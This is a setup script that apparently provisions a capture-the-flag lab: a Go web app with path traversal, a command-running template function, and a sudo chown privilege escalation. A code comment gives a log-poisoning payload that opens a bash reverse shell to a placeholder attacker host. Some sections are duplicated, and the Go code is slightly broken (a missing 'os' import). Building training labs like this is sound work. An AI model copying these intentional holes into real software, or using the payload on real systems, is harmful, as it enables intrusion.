
# Install dependencies
apt-get update
apt-get install -y nginx golang-go

# Setup App Directory
mkdir -p /var/www/app/pages
mkdir -p /var/www/app/config
cd /var/www/app

# Create cars page
cat <<EOF > /var/www/app/pages/cars.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cars & Random things</title>
    <style>
        .car-section { background-color: #f0f0f0; padding: 20px; margin-top: 20px; border-radius: 8px; }
        .random-fact { font-style: italic; color: #555; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to the Car Zone</h1>
        <div class="car-section">
            <h2>About Cars</h2>
            <p>Cars are motor vehicles with wheels. Most definitions of cars say that they run primarily on roads, seat one to eight people, have four wheels, and mainly transport people rather than goods.</p>
            <ul><li>Sedans</li><li>SUVs</li><li>Trucks</li><li>Sports Cars</li></ul>
        </div>
        <div class="output-section">
            <h2>Random Thing</h2>
            <p class="random-fact">Did you know? The first car accident occurred in 1891, in Ohio.</p>
        </div>
        <p><a href="/">Back to Tools</a></p>
    </div>
</body>
</html>
EOF

# --- 1. Create Fake Flags and Assets ---
# Fake Flag in config
cat <<EOF > config.yaml
app_name: "NotesApp"
version: "1.0"
secret: "FLAG{NOT_REAL_BUT_GOOD_LFI}" 
EOF

# Fake Env
cat <<EOF > .env
AWS_ACCESS_KEY_ID=AKIAFAKEACCESSKEY
AWS_SECRET_ACCESS_KEY=FakeSecretKeyDontUseMe
EOF

# Fake Admin Dir (Useless)
mkdir -p /var/www/app/admin
echo "Admin requires local connection" > /var/www/app/admin/index.html

# Fake Backup Config
cat <<EOF > backup.yaml
backup_server: "10.0.0.5"
last_backup: "never"
EOF

# Real Flag 1 (Root fs, accessible via LFI if they guess path, but intend for later or RCE)
# Update: User requested strict privilege escalation.
# This flag is ONLY accessible if they are root (via SSM/IAM abuse).
echo "CTF{GO_LFI_AWS_ROOT}" > /root/root.txt
chmod 400 /root/root.txt
chmod 700 /root

# Initial User Flag (Accessible via RCE as www-data)
echo "CTF{Initial_Shell_Access}" > /var/www/flag.txt



# --- 2. Configure Nginx (Log Poisoning Prep) ---
# We need Nginx logs to be readable by the Go App user (www-data)
# And we need Nginx to log User-Agents.
# Default nginx config does this. We just need permissions.

chmod 644 /var/log/nginx/access.log
chmod 644 /var/log/nginx/error.log

# Configure Nginx Proxy
cat <<EOF > /etc/nginx/sites-available/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;

    server_name _;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
}
EOF

service nginx restart


# --- 3. Create the Vulnerable Go Application ---
cat <<EOF > main.go
package main

import (
	"html/template"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
    "path/filepath"
    "log"
)

// Cmd allows executing system commands from templates
// This is the "hidden" feature that turns LFI into RCE
func Cmd(cmd string) string {
	parts := strings.Fields(cmd)
    if len(parts) == 0 {
        return ""
    }
    // Very basic, no shell expansion unless they use sh -c
	out, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(out)
}

func handler(w http.ResponseWriter, r *http.Request) {
	page := r.URL.Query().Get("page")
	if page == "" {
		page = "home.html"
	}

    // VULNERABILITY: No path sanitization.
    // Also, we use text/template which allows executing functions if defined.
    // We defined 'system' which runs commands.
    // Attack: ?page=../../../../var/log/nginx/access.log
    // Payload in User-Agent: {{system "bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"}}

    path := filepath.Join("pages", page)
    
    // Allow any file extension, or no extension
    
	tmpl := template.New("t").Funcs(template.FuncMap{
		"system": Cmd,
	})

    // ParseFiles will read the file. If it has template syntax, it parses it.
    // If it's a plain text file (like /etc/passwd), it just renders it (unless it has {{}} which is rare).
	t, err := tmpl.ParseFiles(path)
	if err != nil {
        // VULNERABILITY: Verbose error messages leak paths
		http.Error(w, "Error loading page: " + err.Error(), 500)
		return
	}

    // Execute the template.
    // If we loaded access.log, and it has valid template tags, they run.
	err = t.Execute(w, nil)
    if err != nil {
        http.Error(w, "Error rendering page: " + err.Error(), 500)
    }

}

func carsHandler(w http.ResponseWriter, r *http.Request) {
    // Serve the static cars.html file
    // We treat it as a template or just serve file. existing handler uses template, so we can do same or specific.
    // Existing setup has 'pages' folder.
	tmpl, err := template.ParseFiles("pages/cars.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

func robotHandler(w http.ResponseWriter, r *http.Request) {
	host := r.Host
	if host == "" {
		host = "<EC2-IP>"
	}
	content := fmt.Sprintf("User-agent: *\\nDisallow: \\n\\nhttp://%s/?page", host)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(content))
}

func main() {
    // Ensure pages exist
    os.MkdirAll("pages", 0755)
    
    // Create a dummy home page
    if _, err := os.Stat("pages/home.html"); os.IsNotExist(err) {
        f, _ := os.Create("pages/home.html")
        f.WriteString("<h1>Welcome to the internal notes app</h1><p>Use ?page= to navigate.</p>")
        f.Close()
    }

	http.HandleFunc("/", handler)
	http.HandleFunc("/home", carsHandler)
	http.HandleFunc("/robot.txt", robotHandler)
    log.Fatal(http.ListenAndServe(":8080", nil))
}
EOF

# --- 3. Configure SSM User & Sudo Privesc ---
# The default ssm-agent creates 'ssm-user' with full sudo access.
# We want to RESTRICT this to only allow 'chown', forcing the specific privesc.

# Pre-create ssm-user
id -u ssm-user &>/dev/null || useradd -m -s /bin/bash ssm-user

# Configure Sudoers explicitly for ssm-user
# User request: "LFILE=file_to_change; sudo chown $(id -un):$(id -gn) $LFILE"
cat <<EOF > /etc/sudoers.d/ssm-user
ssm-user ALL=(ALL) NOPASSWD: /usr/bin/chown
EOF
chmod 440 /etc/sudoers.d/ssm-user

# IMPORTANT: Remove default cloud-init sudoers for ssm-user if it gets created later
# We'll add a cron or script to ensure our config persists or overwrites defaults
# But simpler: cloud-init runs once. We are in user-data.
# If ssm-agent installation (which might happen on boot) tries to add it, we should prevent it.
# Usually ssm-agent checks /etc/sudoers.d/ssm-agent-users.
echo "ssm-user ALL=(ALL) NOPASSWD: /usr/bin/chown" > /etc/sudoers.d/ssm-agent-users
chmod 440 /etc/sudoers.d/ssm-agent-users


# --- 4. Run the App ---
# User requested "login using ec2-user". 
# 1. Create ec2-user if not exists (Ubuntu AMI doesn't have it by default)
id -u ec2-user &>/dev/null || useradd -m -s /bin/bash ec2-user

# 2. CRITICAL: Ensure ec2-user DOES NOT have sudo access.



# --- 4. Run the App ---
# User requested "login using ec2-user". 
# 1. Create ec2-user if not exists (Ubuntu AMI doesn't have it by default)
id -u ec2-user &>/dev/null || useradd -m -s /bin/bash ec2-user

# 2. CRITICAL: Ensure ec2-user DOES NOT have sudo access.
# By default useradd doesn't grant sudo. We are safe.
# If we were using the 'ubuntu' user, we would need to remove it from 'sudo' group.
# `deluser ubuntu sudo` (Optional, if we switched to ubuntu user)

# 3. Ownership
# Allow ec2-user to read/write app dir and READ Nginx logs
chown -R ec2-user:ec2-user /var/www/app

# Add ec2-user to adm group (or whatever group owns nginx logs) so it can read logs for LFI
# Nginx logs: root:adm usually. 640.
# We did 'chmod 644 /var/log/nginx/access.log' earlier, so everyone can read. 
# So specific group membership isn't strictly required for LFI, but good practice.

# Create a systemd service
cat <<EOF > /etc/systemd/system/go-app.service
[Unit]
Description=Vulnerable Go App
After=network.target

[Service]
User=ec2-user
Group=ec2-user
WorkingDirectory=/var/www/app
ExecStart=/usr/bin/go run main.go
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable go-app
systemctl start go-app

# --- 5. Clean up ---
# Remove history or temporary files if any
history -c

